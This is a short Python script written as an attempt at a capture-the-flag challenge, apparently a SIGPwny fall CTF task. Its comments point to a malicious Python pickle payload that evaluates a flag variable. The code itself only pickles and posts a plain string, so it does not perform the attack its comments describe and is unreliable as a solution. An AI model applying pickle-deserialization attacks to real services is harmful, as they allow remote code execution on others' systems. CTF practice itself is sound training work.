# http://cucumber.chal.fallctf.sigpwny.com:8006 
# get the flag 
# pickling exists in python too
# a malicious "pickle" payload could get the flag
# could you EVALuate the flag variable somehow?

#use pickle to get the flag
import pickle
import requests
import base64

url = "http://cucumber.chal.fallctf.sigpwny.com:8006/"

# get the cookie
r = requests.get(url)
cookie = r.cookies['session']

# get the flag
r = requests.get(url, cookies={'session': cookie})
flag = r.text.split(" ")[-1]

# pickle the flag
pickled_flag = pickle.dumps(flag)

# base64 encode the pickled flag
encoded_flag = base64.b64encode(pickled_flag)

# send the pickled flag
r = requests.post(url, cookies={'session': cookie}, data={'flag': encoded_flag})
print(r.text)
